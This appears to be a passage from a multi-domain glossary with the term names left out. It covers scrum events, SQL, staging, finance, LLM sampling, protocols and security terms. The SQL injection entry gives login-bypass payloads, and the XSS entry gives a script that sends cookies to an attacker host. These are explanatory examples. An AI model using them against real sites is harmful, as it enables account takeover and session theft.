Sprint planning kicks off every iteration and lasts at most eight hours when the sprint is one month long; shorter sprints get a shorter planning session. The gathering addresses three key topics: Why is this sprint valuable (formulating the sprint goal)? What can be done in this sprint (selecting backlog items)? How will the team deliver it (decomposing items into technical tasks)? The resulting plan forms the sprint backlog.

## Technical definition
The initial formal event of a sprint wherein the entire Scrum team agrees on a sprint goal together and selects actionable product backlog items based on capacity.

## Examples
During a three-hour planning meeting, an engineering team commits to eight user stories required to support a new credit card gateway, establishing a clear sprint goal for launch.

## Easy explanation
Think of a sprint retrospective as a post-race team debrief in professional motorsports: engineers and drivers review pit-stop delays, analyze tire wear, and tune engine protocols before the next race.

## Details
The retrospective closes the active sprint, occurring right after the sprint review. It focuses strictly on internal operations rather than product features. Participants inspect how the iteration unfolded with respect to individuals, interactions, workflows, and environmental tooling. The team identifies what worked well, what caused friction, and what should change. The highest-priority actionable improvement items are often integrated directly into the upcoming sprint backlog.

## Technical definition
A timeboxed inspect-and-adapt ceremony concluding a sprint, where the Scrum team decides how to raise software quality and operational effectiveness.

## Examples
Following a messy release caused by failing automated tests, the team uses its retrospective to agree on a rule that all pull requests must execute smoke tests before merging.

## Easy explanation
Like asking a librarian questions using clear sentences: "Show me all books written by Tolkien published after 1950 sorted by title."

## Details
SQL operates declaratively; users specify what records they want rather than writing step-by-step memory algorithms. Commands encompass Data Query Language (SELECT), Data Manipulation Language (INSERT, UPDATE, DELETE), and Data Definition Language (CREATE, ALTER).

## Technical definition
An ANSI/ISO standardized domain-specific declarative language designed for managing stream-oriented data structures and relational tables.

## Examples
Executing `SELECT name, email FROM customers WHERE active = true ORDER BY created_at DESC;` to list registered customers.

## Easy explanation
Like filling out a paper form where, in the name box, someone writes "Tear up this contract and give me all the money," and an automated scanner obediently follows those written instructions.

## Details
SQL injection happens when untrusted user input is directly concatenated into dynamic SQL queries without sanitization or parameter binding. Attackers inject operators like `' OR '1'='1` to bypass authentication, read sensitive records, modify stored data, or drop entire tables.

## Technical definition
A code injection technique exploiting lack of input validation and parameterized queries, allowing unauthorized execution of arbitrary SQL syntax within a relational database.

## Examples
Entering `' OR 1=1; --` into a login username box to bypass authentication checks and log in as the administrator.

## Easy explanation
Think of a dress rehearsal in a theater: the actors wear full costumes, the lighting and sound equipment run at full volume, and every scene is performed on the real stage before opening night.

## Details
A staging environment acts as the final quality gate before software reaches live end users. It runs on infrastructure that closely mirrors production sizing, networking, and third-party integrations. Teams use staging for end-to-end integration tests, load testing, performance profiling, and user acceptance testing (UAT).

## Technical definition
A pre-release deployment target architected to achieve environmental parity with production systems for deterministic validation testing.

## Examples
Deploying a release candidate to `staging.example.com` where QA testers run automated end-to-end browser tests against a sanitized database clone.

## Easy explanation
Think of stakeholders as everyone seated around a community town hall table when a new railway is proposed: passengers want punctuality, local residents worry about noise, city planners track safety, and taxpayers scrutinize the budget.

## Details
Stakeholders represent diverse internal and external constituencies with a vested interest in the product's trajectory. Internal stakeholders include executive sponsors, sales representatives, customer support leads, compliance attorneys, and security teams. External stakeholders encompass paying clients, regulatory bodies, and supply partners. Effective product managers maintain proactive communication cadences with each cohort to identify hidden operational constraints and secure buy-in without letting design-by-committee derail the roadmap.

## Technical definition
An individual, group, or organization that holds a legitimate stake, requirement, or interest in the operational life cycle or outcomes of a system.

## Examples
During an enterprise software overhaul, stakeholders include the chief security officer requiring strict audit logs and the customer support manager advocating for faster ticket-search tools.

## Easy explanation
Pre-money valuation is the negotiated price tag placed on a startup before a new investor writes a check and deposits money into its bank account.

## Details
The figure is crucial because adding the new cash investment to the pre-money valuation yields the post-money valuation, which directly sets the percentage stake the incoming investor receives. Founders strive for higher pre-money valuations to minimize dilution, while investors balance valuation against sustainable future milestones.

## Technical definition
The negotiated enterprise valuation of an entity prior to the receipt of proceeds from a primary equity issuance, establishing share price on a fully diluted basis.

## Examples
An entrepreneur agrees to an $8 million pre-money valuation with a venture fund investing $2 million, creating a $10 million post-money value with the investor owning 20 percent.

## Easy explanation
Owning stock is like buying a single slice of a giant commercial pizza: when the pizzeria expands and earns bigger profits, your slice becomes more valuable, but if business collapses, your slice shrinks in value.

## Details
Corporations issue shares of common and preferred stock to raise investment capital without taking on loan obligations. Stockholders participate in corporate growth through two primary channels: capital appreciation when the share price increases, and dividend distributions when the board of directors shares quarterly earnings. Common shareholders typically hold voting rights at annual general meetings to elect directors. However, in the event of corporate liquidation or bankruptcy, equity holders maintain residual claims and are paid last, only after bondholders and trade creditors have been satisfied.

## Technical definition
A financial instrument representing residual equity ownership in the capital structure of a joint-stock enterprise, conveying proportional rights to operating earnings and net liquidation assets.

## Examples
An investor purchases 100 shares of an enterprise at $50 per share; if the share price rises to $65 over two years while paying a $2 annual dividend per share, the total return equals $1,900.

## Easy explanation
A stock exchange is like a central trading pavilion for financial investments: instead of consumer merchandise, traders gather under strict market rules to buy and sell slices of corporations at transparent, continuously updated auction prices.

## Details
Modern stock exchanges operate electronic central limit order books that automatically match buy orders (bids) with sell orders (asks) based on price-time priority. Exchanges impose rigorous listing standards on corporations, demanding regular audited financial reports, corporate governance compliance, and minimum public float thresholds. Major global exchanges include the New York Stock Exchange (NYSE), Nasdaq, London Stock Exchange (LSE), and Tokyo Stock Exchange (TSE). Exchanges also provide real-time price discovery, market surveillance against manipulation, and trade clearing through central counterparty clearinghouses.

## Technical definition
A formally organized and supervised secondary market facility providing auction mechanisms, trade execution infrastructure, and regulatory oversight for the standardized transfer of listed financial securities.

## Examples
A brokerage client places an electronic limit order to purchase 50 shares of an enterprise at $180; the stock exchange matching engine pairs the order against a seller's ask within microseconds and confirms execution.

## Easy explanation
Think of story points like sizing t-shirts (S, M, L, XL) or coffee cups: you instinctively know a grande beverage is twice as large as a small espresso without needing a stopwatch to measure how long it takes to drink.

## Details
Story points detach estimation from emotional debates over hourly duration, factoring in three interrelated dimensions: the amount of work, technical complexity, and inherent uncertainty or risk. Teams frequently use the modified Fibonacci sequence (1, 2, 3, 5, 8, 13, 21) during planning poker sessions. By comparing new user stories against established benchmark tasks, developers reach rapid consensus on relative scope without getting bogged down in individual speed disparities.

## Technical definition
A dimensionless relative metric adopted by agile development squads to represent the composite effort, technical difficulty, and risk of an item in the product backlog.

## Examples
A team assigns 2 points to adding a database column and 8 points to rebuilding the checkout payment flow, acknowledging the latter involves higher complexity and third-party dependencies.

## Easy explanation
A storyboard is like a comic strip of your movie drawn on paper before you shoot it: it helps the entire crew picture every camera angle and action before turning on the expensive gear.

## Details
Pre-production relies on storyboards to translate abstract screenplay directions into concrete visual language. Each drawn panel depicts frame composition, camera movement arrows (pans, tilts, zooms), character blocking, and dialogue cues. In animated films and visual effects heavy action movies, storyboards are scanned and edited with scratch audio into timed video reels called animatics to test pacing and ensure spatial continuity.

## Technical definition
A graphic organizer displaying illustrations or images arranged chronologically to pre-visualize motion picture sequences, interactive media, or animations.

## Examples
A television commercial director presents a twelve-frame storyboard to an advertising client, demonstrating how the product reveal transitions smoothly into the concluding brand logo animation.

## Easy explanation
Like asking for the answer on a printed form with fixed boxes instead of in a free-form letter.

## Details
Applications often need fields, not prose. A schema lists the required keys and their types; in a structured-output mode the provider constrains generation so the response always matches it, rather than relying on instructions alone. It pairs naturally with function calling, whose arguments are structured too.

## Technical definition
Generation constrained by a schema supplied by the caller, so that the output is syntactically valid and conforms to that schema, for example JSON.

## Examples
A shop extracts name, phone number and address from customer messages; every reply is valid JSON that goes straight into the order system.

## Easy explanation
If the primary agent is a general contractor managing a home renovation, subagents are the specialized electrician, plumber, and painter called in to complete specific jobs without worrying about the whole house schedule.

## Details
In multi-agent architectures, complex goals often overwhelm a single context window. A primary agent decomposes requirements into modular tasks and orchestrates specialized subagents with isolated prompt contexts, dedicated toolsets, and scoped system instructions. Subagents execute their assignment, report structured findings back to the supervisor, and terminate, keeping the primary agent's token budget focused and unpolluted.

## Technical definition
A subsidiary computational agent instantiated by a supervisory orchestrator, operating within an isolated context envelope to solve a delimited functional subproblem.

## Examples
A lead documentation agent spawning a dedicated subagent to grep through a repository codebase and extract API route definitions, returning only the final summary table.

## Easy explanation
It is like the briefing a new receptionist gets before the first visitor arrives: which company they represent, what they may promise and how formal to be.

## Details
Chat APIs keep a system message apart from the user and assistant turns. Developers use it for the assistant’s role, constraints, tone and background facts. Models usually give it more weight than ordinary user text, but it is not a security boundary: users can still try to override it through prompt injection.

## Technical definition
The instruction block supplied to a chat model outside the user turns, defining its role, behaviour and context for the whole conversation.

## Examples
An online bank’s chatbot is told in its system prompt to answer only about the bank’s cards, in Vietnamese, and to hand account questions to a human agent.

## Easy explanation
Taking out a financial loan: borrowing time today to launch a product faster lets you meet a deadline, but you must pay continuous interest in slower progress until you repay the principal by rewriting the code.

## Details
Ward Cunningham coined the metaphor to explain why software slows down over time. Shortcuts like hard-coded parameters, skipping unit tests, or delaying component modularization allow early releases. However, each subsequent modification takes longer because developers must navigate convoluted workarounds, accumulating interest in the form of friction and defect fixes.

## Technical definition
The latent structural deficit within a software codebase resulting from expedience-driven compromises, incurring escalating recurring maintenance overhead until remediated through refactoring.

## Examples
A startup hardcodes payment gateway logic to launch before Black Friday; months later, adding a new payment vendor requires weeks of untangling instead of hours of configuration.

## Easy explanation
Telemetry is like a real-time health tracker for remote machinery: instead of sending an engineer with a clipboard to read gauges in the desert or atop a wind turbine, the equipment automatically transmits its vitals across the network every few seconds.

## Details
Telemetry architectures involve data sampling at the edge, local timestamping, numerical quantization, and serialization over protocols like MQTT, CoAP, or HTTP. In high-density fleets, continuous transmission creates substantial bandwidth costs, motivating edge filtering techniques such as deadband compression (only publishing when a value shifts beyond a threshold) and batching. Receiving cloud pipelines ingest telemetry through streaming event brokers into distributed time-series databases for real-time alerting and historical trending.

## Technical definition
The highly automated transmission of empirical operational measurements and status data from remote or inaccessible sources to receiving equipment for recording and diagnostic evaluation.

## Examples
An electric vehicle transmitting battery cell temperatures, instantaneous motor current, and state of charge every two seconds over cellular telemetry pipelines to fleet management servers.

## Easy explanation
Think of temperature like the heat dial on a popcorn popper: at low heat, only the most ready kernels pop in a steady, predictable order; crank the heat up, and kernels fly wildly and unexpectedly in all directions.

## Details
Before a language model outputs its next token, it calculates raw unnormalized numerical scores called logits. Temperature divides these logits prior to the softmax normalization step. A low temperature (e.g., 0.1 to 0.2) steepens probability peaks, causing the model to reliably select the highest-scoring words—ideal for coding, mathematics, and data extraction. A high temperature (e.g., 0.8 to 1.2) flattens the distribution, giving lower-ranked candidate tokens greater odds of selection for brainstorming and storytelling.

## Technical definition
A scaling divisor applied to logit vectors prior to softmax normalization that modulates the entropy of the categorical predictive probability distribution.

## Examples
Setting temperature to 0.0 when querying a financial model for exact quarterly balance sheet metrics, ensuring consistent, repeatable numerical answers.

## Easy explanation
A term deposit is like locking your money inside a time-release vault for six months or a year: because you promise not to touch the cash until the timer expires, the bank rewards your commitment with a higher payout.

## Details
When placing funds into a term deposit (often called a Certificate of Deposit or CD), the depositor commits to leaving the principal untouched for durations ranging from one month to five years. In exchange, the financial institution guarantees a fixed interest rate unaffected by subsequent market fluctuations. If the depositor needs to withdraw the principal before the maturity date, the bank assesses an early withdrawal penalty, typically forfeiting several months of accrued interest. Upon maturity, the investor can either cash out or roll over into a new term deposit.

## Technical definition
A promissory time deposit liability of a financial institution paying a fixed or indexed coupon until a designated maturity date, governed by legal restrictions against premature liquidation without forfeiture of yield.

## Examples
An investor places $20,000 into a 12-month term deposit paying a fixed 5.0% APY, earning exactly $1,000 in guaranteed interest at maturity without exposure to market fluctuations.

## Easy explanation
Picture water streaming through a wide plumbing pipe: throughput reflects the gross volume of liquid exiting the spout each minute, regardless of how quickly individual droplets travel.

## Details
Throughput measures capacity and velocity in distributed systems. It is commonly quantified as requests per second (RPS), transactions per second (TPS), or megabits per second (Mbps). While latency tells you how fast an individual operation is, throughput reveals the total load the system can sustain before processing buffers saturate.

## Technical definition
A quantitative rate metric defining the volume of successful processing operations, messages, or bytes transferred over a specified time interval.

## Examples
A distributed message broker achieving a sustained throughput of 250,000 published messages per second under peak streaming load.

## Easy explanation
Like dispatching financial documents inside a reinforced armored vehicle that drives directly between bank branches, preventing anyone on the street from peeking inside or swapping the cargo.

## Details
TLS (the modern successor to SSL) operates between the transport layer and the application layer. During the initial TLS handshake, the client verifies the server's digital certificate (issued by a trusted Certificate Authority), negotiates cipher suites, and establishes ephemeral symmetric encryption keys.

## Technical definition
A cryptographic security protocol specified by the IETF (RFC 8446) providing end-to-end encryption, endpoint authentication, and message integrity across IP networks.

## Examples
Securing an online banking session over HTTPS so internet service providers and coffee shop Wi-Fi snoops cannot capture submitted passwords.

## Easy explanation
Like an all-day wristband at a festival: you show it at every stage entrance without re-checking your passport each time.

## Details
Issued by an authentication server after validating credentials, commonly formatted as a JSON Web Token (JWT) bearing cryptographic signatures and expiration timestamps.

## Technical definition
A compact, verifiable claim container passed in request headers (e.g., HTTP `Authorization: Bearer <token>`) providing stateless authorization.

## Examples
An OAuth 2.0 bearer token attached to API requests to access private user profile resources.

## Easy explanation
Like arcade tokens: you convert regular currency into custom tokens usable only within specific decentralized game systems or platforms.

## Details
Unlike native network coins (such as BTC or ETH), tokens rely on underlying smart contract standards such as ERC-20 or SPL on Solana.

## Technical definition
A fungible or non-fungible programmable cryptographic ledger entry administered by smart contracts on a distributed ledger.

## Examples
The UNI governance token or the USDC stablecoin smart contract deployed on the Ethereum blockchain.

## Easy explanation
AI does not read complete words like people do; it chops words into Lego-like bricks called tokens to calculate next-word probabilities.

## Details
In English, 1,000 tokens equal roughly 750 words. Model context limits and API pricing tiers are measured strictly in token counts.

## Technical definition
The atomic sequence unit generated by a tokenizer (e.g. BPE) fed into the transformer embedding layer.

## Examples
The word "unbelievable" might be split into tokens: ["un", "believ", "able"].

## Easy explanation
Like cutting a sentence into puzzle pieces from a fixed set of shapes before feeding them into the machine.

## Details
Most LLM tokenizers use subword methods such as byte-pair encoding: a frequent word becomes one token, a rare word several. Every model has its own vocabulary, so the same text yields different token counts on different models, and Vietnamese with its diacritics often needs more tokens than English for the same meaning. Multimodal models tokenize images or audio as well.

## Technical definition
The algorithm that maps raw input, such as text, to the units (tokens) and integer ids a model works with.

## Examples
The word “unbelievable” may become “un”, “believ” and “able”; a 1,000-word Vietnamese article can use noticeably more tokens than its English translation.

## Easy explanation
Imagine a restaurant menu where the waiter only allows you to choose from popular dishes whose combined orders make up 90% of all diner requests, completely ignoring obscure dishes that almost nobody likes.

## Details
Also termed nucleus sampling, top-p pools tokens in descending order of probability until their cumulative sum reaches threshold p (e.g., 0.90 or 0.95). Any tokens outside this cumulative nucleus are filtered out before the final random selection occurs. When a model is highly confident (e.g., following "The capital of France is"), the candidate set shrinks automatically to one or two tokens; when many words fit naturally, the pool expands.

## Technical definition
A stochastic decoding truncation strategy that dynamically restricts the sampling vocabulary to the minimal set of top-ranked tokens whose cumulative probability mass exceeds parameter p.

## Examples
Configuring top-p to 0.90 during essay generation, ensuring the model chooses only among the most sensible next words while cutting off bizarre, low-probability tail tokens.

## Easy explanation
Older translation tools read sentences word by word from left to right like someone scanning a sentence with a finger; a Transformer takes in the whole paragraph in one glance, instantly grasping how distant words relate to each other.

## Details
Introduced in 2017, the Transformer replaced sequential recurrence with stacked self-attention and position-wise feedforward modules. Positional encodings provide sequence order awareness. Multi-head attention projects inputs into distinct subspaces, computing attention weights across all tokens simultaneously. This parallel structure allows training across billions of tokens on high-performance accelerators, establishing the backbone of modern LLMs, multimodal systems, and code generators.

## Technical definition
A feedforward sequence transduction architecture based on multi-head self-attention and positional embeddings, dispensing with recurrent and convolutional recurrences.

## Examples
Decoder-based Transformer architectures generating fluent essays by predicting subsequent token probability distributions conditioned on prompt histories.

## Easy explanation
Having a mechanical coin sorter that only accepts 25-cent coins into a specific slot, immediately rejecting any coin that has the wrong shape or thickness.

## Details
Type checking guarantees that operations are performed only on valid data types, avoiding runtime crashes such as calling a nonexistent method on undefined. Static type checking occurs during compilation or linting (as seen in TypeScript, Go, or Rust), highlighting defects directly in the code editor. Dynamic type checking validates types at runtime when instructions execute (common in Python, Ruby, or JavaScript).

## Technical definition
A formal static or dynamic analysis procedure in programming language semantics verifying that expressions and operators adhere to predefined type constraints and structural contracts.

## Examples
The TypeScript compiler flags an error when passing a string parameter into a mathematical function expecting a number.

## Easy explanation
Typography is like the clothing that words wear: a formal serif font looks like a tailored business suit, while a bubbly rounded font looks like casual vacation attire.

## Details
Good typography balances aesthetic character with effortless readability. Designers manipulate typeface classifications (serif, sans-serif, slab, monospace, display), hierarchy scales, tracking (letter spacing across whole words), kerning (space between individual character pairs), leading (line height), and line length (measure). In digital user interfaces, responsive typography adjusts fluidly across smartphone screens and desktop monitors to prevent eye strain.

## Technical definition
The art, process, and technical discipline of designing, selecting, and arranging letterforms, typefaces, and whitespace within graphic compositions to optimize visual communication and legibility.

## Examples
A luxury watch catalog pairs a classical high-contrast serif typeface for elegant chapter headings with a clean geometric sans-serif for tiny technical movement specifications.

## Easy explanation
Inspecting each individual brick for cracks and standard measurements before assembling them into a brick wall.

## Details
Unit tests typically follow the Arrange-Act-Assert (AAA) pattern. They exercise small computational units like pure functions, methods, or classes. To ensure fast execution and reliable isolation, all external dependencies like file systems, databases, and network APIs are substituted with mocks or stubs.

## Technical definition
A fine-grained automated validation procedure executed against isolated modular software primitives to assert programmatic correctness under deterministic preconditions.

## Examples
Testing an e-commerce discount calculator function to ensure that supplying an input of 1,000,000 VND and a 10% coupon code yields an output of exactly 900,000 VND.

## Easy explanation
Think of an electric light bulb at home: uptime is the percentage of the year the light turns on whenever you flip the switch, compared to the rare minutes the power is out.

## Details
Uptime is commonly expressed as a percentage known as "nines of availability." For example, 99.9% uptime ("three nines") permits about 43.8 minutes of unplanned downtime per month, whereas 99.999% uptime ("five nines") allows only 26 seconds of downtime per month. Uptime monitoring uses external polling probes to test HTTP endpoints continuously.

## Technical definition
A quantitative availability metric measuring the ratio of operational runtime duration to total scheduled time interval.

## Examples
A cloud payments platform reports 99.98% uptime over the past 365 days, experiencing a total of just one hour and 45 minutes of cumulative downtime.

## Easy explanation
Think of a user story as an index card stating a customer wish list item in plain language, describing who wants the tool and what problem it solves without getting tangled in engineering jargon.

## Details
User stories commonly follow a standardized narrative template: "As a [type of user], I want [an action] so that [a benefit is achieved]." This structure ensures engineers remain anchored to genuine customer motivations rather than abstract technical chores. Stories serve as invitations to collaborative conversations between product managers, designers, and developers. Each story carries acceptance criteria stating when the requirement has been successfully realized.

## Technical definition
A lightweight functional requirement artifact in agile development defining a discrete slice of end-user functionality and its associated business rationale.

## Examples
"As a shopper on an e-commerce platform, I want to keep products in a saved list so that I can watch for price drops and purchase them on payday."

## Easy explanation
Think of a return mailing envelope printed with a tiny colored stamp indicating whether it came from a newspaper coupon, a street flyer, or a magazine insert so the postal clerk knows exactly which advertisement prompted the reply.

## Details
Named after the Urchin Tracking Module (the web analytics technology acquired by Google in 2005 that formed the foundation of Google Analytics), UTM parameters are key-value pairs appended after a question mark (`?`) in a target URL. Standard implementations employ five primary dimensions: `utm_source` (identifying the referring platform, such as newsletter or facebook), `utm_medium` (the marketing channel type, such as cpc, email, or social), `utm_campaign` (the specific promotion name), `utm_term` (paid search keywords), and `utm_content` (differentiating specific links or creative variations within the same ad). When a visitor clicks a tagged link, analytics scripts parse these parameters, attributing session performance and revenue back to exact promotional activities.

## Technical definition
Standardized URL query string key-value attributes consumed by web analytics telemetry engines to populate multi-channel campaign attribution dimensions upon HTTP request parsing.

## Examples
A marketing agency promotes a seasonal sale on social media by sharing a link structured as `https://example.com/shop?utm_source=facebook&utm_medium=paid-social&utm_campaign=summer-sale-2026`, enabling analytics reports to isolate sales driven specifically by that campaign.

## Easy explanation
VAT is a consumption tax added onto products as they move through manufacturing and distribution, ultimately paid by the end customer when buying in store.

## Details
Unlike simple turnover taxes that compound repeatedly, registered businesses only remit tax on the value they personally create. Companies collect output tax from buyers, deduct the input tax already paid to their own suppliers, and remit the net difference to national tax authorities.

## Technical definition
An indirect, broad-based consumption tax collected fractionally through registered businesses, designed with an invoice-credit mechanism to avoid compounding.

## Examples
A furniture maker buys lumber for $100 plus $10 VAT, constructs a dining table sold for $250 plus $25 VAT, and forwards $15 net VAT to the revenue agency.

## Easy explanation
Like a librarian who shelves books by how close their topics are rather than by title, so asking for one book brings its neighbours too.

## Details
Each record holds a vector plus metadata. Instead of exact matching, a query asks for the nearest neighbours by cosine or Euclidean distance. Approximate nearest-neighbour indexes such as HNSW or IVF keep this fast over millions of vectors by giving up a little accuracy. Many general-purpose databases now offer vector search beside their usual queries.

## Technical definition
A data store specialised in indexing and querying high-dimensional vectors by similarity, typically with approximate nearest-neighbour search.

## Examples
An online shop stores an embedding for every product photo; a shopper uploads a picture and gets the ten most similar items.

## Easy explanation
Think of velocity as a cargo boat's typical cruising speed measured in containers delivered per week; knowing this baseline helps harbor dispatchers predict how long it will take to move an entire shipment.

## Details
Velocity is calculated by summing the story point values of all backlog items satisfying the Definition of Done by the end of a sprint. Incomplete tasks contribute zero points. Over several stable sprints, the rolling average provides an empirical baseline for capacity forecasting during sprint planning. Because different teams possess unique estimation calibrations and skills, velocity is strictly an internal calibration tool and must not be used as an inter-team benchmark.

## Technical definition
A metric in agile development capturing the sum of story point units delivered to production-ready completion by an engineering team within a standard iteration.

## Examples
A development squad completes 32, 28, and 30 story points across three consecutive sprints, giving them an average velocity of 30 points for future planning.

## Easy explanation
Venture capital is funding provided by professional investors to ambitious young startups that carry high risk of failure but have the potential to grow massive.

## Details
Venture firms raise pooled capital from institutional limited partners to finance emerging enterprises across progressive funding stages from Seed through Series A, B, and C. Because the vast majority of startups fail, fund economics depend heavily on rare breakout winners that return the entire fund through massive acquisitions or public IPOs.

## Technical definition
Private equity institutional capital pooled into limited partnerships to acquire minority equity stakes in unquoted early-stage enterprises exhibiting asymmetric risk-reward profiles.

## Examples
A Silicon Valley venture fund invests $5 million into an AI drug discovery startup in return for a 20 percent preferred equity ownership position.

## Easy explanation
Like upgrading your family car: replacing a small 4-cylinder engine with a powerful V8 engine to haul heavier trailers without buying a second automobile.

## Details
Vertical scaling (scaling up) augments the capacity of an individual system by replacing its host machine or instance profile with a larger tier (for example, moving from a 4-core, 16 GB RAM instance to a 16-core, 64 GB RAM instance). It requires no modifications to application code or clustering logic, making it ideal for monolithic systems or stateful relational databases that cannot easily be partitioned. However, hardware has strict physical upper bounds, high-end instance pricing grows exponentially, and resizing virtual machines often necessitates a reboot.

## Technical definition
The expansion of single-node throughput and processing capability through the physical or virtual augmentation of compute, memory, and I/O resources.

## Examples
A database administrator scaling up an analytics server from 8 CPU cores and 32 GB RAM to 32 CPU cores and 128 GB RAM to process monthly financial reconciliation reports.

## Easy explanation
Think of an apartment building: the physical structure is the host server, but each apartment is a self-contained home with its own front door, kitchen, and climate control, completely isolated from neighbors.

## Details
A virtual machine runs on top of a hypervisor (such as KVM, ESXi, or Hyper-V) that partitions physical CPU, RAM, disk, and network interfaces. Because each VM runs its own independent operating system kernel, it provides strong security boundaries and can host legacy software requiring specific OS builds, albeit with higher memory overhead and slower boot times than containers.

## Technical definition
A hardware-level virtualization construct emulating an independent computing architecture executing an autonomous guest operating system.

## Examples
An Ubuntu 24.04 virtual machine provisioned on an enterprise cloud host with 4 virtual CPUs and 16 GB of dedicated RAM.

## Easy explanation
Visual hierarchy is like organizing an orchestra: the brass section blasts the main melody so you notice it first, while the softer flutes and violins provide supporting background harmony without competing.

## Details
Graphic designers establish visual hierarchy through scale, contrast, color saturation, proximity, and spatial alignment. By sizing dominant headlines substantially larger than secondary subheads and body copy, layouts signal where human attention should land first. Strategic use of white space isolates critical call-to-action buttons, preventing clutter and enabling readers to scan dense information architectures quickly.

## Technical definition
The deliberate spatial and aesthetic arrangement of graphical elements within a visual field to communicate relative importance and direct the sequential path of visual perception.

## Examples
A newspaper front page establishes hierarchy with a huge seventy-two-point top headline, a medium twenty-four-point secondary deck, and small ten-point three-column body text accented by bold pull quotes.

## Easy explanation
A voice-over is like a tour guide talking in your ear while you look at museum exhibits: you hear their clear voice explaining the sights, but their face never shows up in the picture.

## Details
Voice-over techniques feature extensively in documentaries, commercials, instructional tutorials, audiobooks, and video games. Voice actors record scripted narration inside isolated sound booths equipped with sensitive condenser microphones and pop filters. Audio engineers process the recorded tracks through equalization, compression, and de-essing before ducking background music tracks so speech remains effortlessly legible.

## Technical definition
An audio production technique where an off-camera narrator or actor provides recorded spoken dialogue that accompanies visual cinematography without showing the speaker's physical mouth movements.

## Examples
A nature documentary presents slow-motion footage of a cheetah stalking prey across the savannah while an unseen narrator calmly whispers the predator's tactical maneuvers.

## Easy explanation
Volatility is like turbulence during a flight: a smooth flight glides steadily with barely a bump, while severe turbulence causes the plane to drop and bounce violently without changing where you are heading.

## Details
In finance, volatility quantifies how widely price swings deviate from the average return over time. It is commonly calculated as the annualized standard deviation of daily logarithmic price changes. Higher volatility indicates greater price uncertainty and wider swings in value, translating into elevated investment risk along with higher profit potential for short-term traders. Markets measure forward-looking volatility expectations through specialized indicators like the VIX index, which tracks option pricing on benchmark equity indexes. Long-term investors often use diversification and asset allocation to dampen portfolio volatility.

## Technical definition
A statistical dispersion metric representing the annualized standard deviation of the continuously compounded rate of return on a financial instrument.

## Examples
A steady public water utility stock trades within a tight range of $48 to $52 over an entire fiscal year, exhibiting low volatility, whereas a speculative early-stage biotech stock swings violently between $15 and $95 across several months, displaying high volatility.

## Easy explanation
Like keeping an open tab at a coffee shop: you show your order number each time you walk up to the counter, and the barista instantly knows which drinks belong to your bill.

## Details
Because HTTP is stateless, the server creates a session record upon login, assigns a unique cryptographically random identifier (SID), and transmits this key inside an HTTP-only browser cookie. On subsequent requests, the server matches the SID against its memory cache or database to restore user context.

## Technical definition
A stateful server-side persistence context identified by an opaque session key exchanged over HTTP to preserve client authentication state across discrete network interactions.

## Examples
Keeping a user logged in across checkout, product browsing, and profile viewing pages via a session ID stored in Redis.

## Easy explanation
Instead of repeatedly checking your mailbox every five minutes to see if a package arrived, the delivery driver rings your doorbell the instant it drops onto your porch.

## Details
Webhooks reverse the traditional polling workflow. When an event takes place in a third-party service (such as a successful checkout or code push), that service immediately crafts an HTTP request containing a JSON payload and transmits it directly to a pre-registered callback URL.

## Technical definition
A user-defined HTTP callback mechanism enabling asynchronous event-driven system notifications without client-side polling loops.

## Examples
A payment gateway firing an HTTP POST notification to an e-commerce platform the moment a customer completes a QR code transfer.

## Easy explanation
Like a direct telephone call: once the call connects, both you and the person on the other end can speak and listen simultaneously without having to hang up and redial for each sentence.

## Details
Standard HTTP request-response requires clients to initiate every exchange, forcing real-time web applications to use inefficient short-polling or long-polling. The WebSocket protocol starts over standard HTTP/1.1 or HTTP/2 ports with an Upgrade header request. Upon receiving an HTTP 101 Switching Protocols response, the underlying TCP connection switches to a persistent framing protocol. Both client and server can transmit binary and UTF-8 message frames arbitrarily with minimal 2-to-10-byte overhead per frame, eliminating HTTP header bloat.

## Technical definition
A standardized bidirectional transport protocol establishing persistent full-duplex framing channels over a single underlying TCP socket via protocol negotiation.

## Examples
A collaborative document editor establishing a WebSocket session where 5 concurrent authors exchange cursor positions and keystrokes in real time with sub-10-millisecond latency.

## Easy explanation
Working capital is the everyday pocket money of a business, calculated by taking all cash, inventory, and pending customer checks and subtracting bills due within the year.

## Details
Positive net working capital indicates that an organization can pay suppliers, meet payroll, and navigate supplier delays without resorting to emergency credit lines. Efficient working capital management targets quick inventory turnover and prompt customer collections while negotiating reasonable payment terms with suppliers.

## Technical definition
A liquidity metric equal to current assets minus current liabilities, quantifying short-term operational reserves and financial flexibility.

## Examples
A retail grocery store maintains $4 million in cash and store merchandise against $2.5 million in supplier invoices, holding $1.5 million in net working capital.

## Easy explanation
Like sticking a fake, malicious instructions sign onto a trusted public bulletin board; anyone who walks up to read the board follows the bad instructions thinking the building management posted it.

## Details
XSS occurs in stored, reflected, or DOM-based forms when web applications render unsanitized user content directly into HTML output. The injected JavaScript runs with the authority of the victim's session, allowing attackers to exfiltrate cookies, steal tokens, or deface page content.

## Technical definition
A security flaw wherein an application includes untrusted data in an HTTP response without adequate validation or escaping, leading to unauthorized script execution within the user's browser context.

## Examples
Posting `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` in a forum comment thread so readers' session tokens are sent to an attacker.

## Easy explanation
Like an airport security terminal where passengers must display their boarding pass and passport at the entrance, at security scanners, and again at the boarding gate.

## Details
Traditional perimeter security trusted anyone inside the corporate VPN or office Wi-Fi. Zero Trust eliminates implicit trust zones: every access request undergoes strict authentication, device posture checks, risk-based authorization, and continuous end-to-end encryption regardless of physical location.

## Technical definition
A comprehensive enterprise security architecture based on the tenet "never trust, always verify," enforcing dynamic context-aware policy checks across all network communications.

## Examples
Requiring employees on office Wi-Fi to pass biometric MFA and device health checks before accessing an internal company repository.

## Easy explanation
Zigbee is a wireless standard where powered devices like smart bulbs and wall switches act as signal relays: instead of every device trying to shout directly to a faraway internet router, messages hop from lamp to switch until they reach the central hub.

## Details
Governed by the Connectivity Standards Alliance (CSA), Zigbee builds on top of the physical and MAC layers defined in IEEE 802.15.4 (typically in the 2.4 GHz band with data rates up to 250 kbps). A Zigbee network consists of a single Coordinator (initiating the network and managing security keys), multiple Routers (mains-powered nodes that forward packets), and End Devices (sleepy, battery-powered sensors). Its self-healing mesh routing protocol dynamically establishes alternative paths when any router node fails or becomes obstructed.

## Technical definition
An open global wireless specification for high-density, low-power mesh networking based on the IEEE 802.15.4 radio standard, engineered for control and monitoring applications.

## Examples
A mesh of twenty wireless Zigbee radiator valves across an office building hopping data through ceiling light fixtures back to a central boiler thermostat.
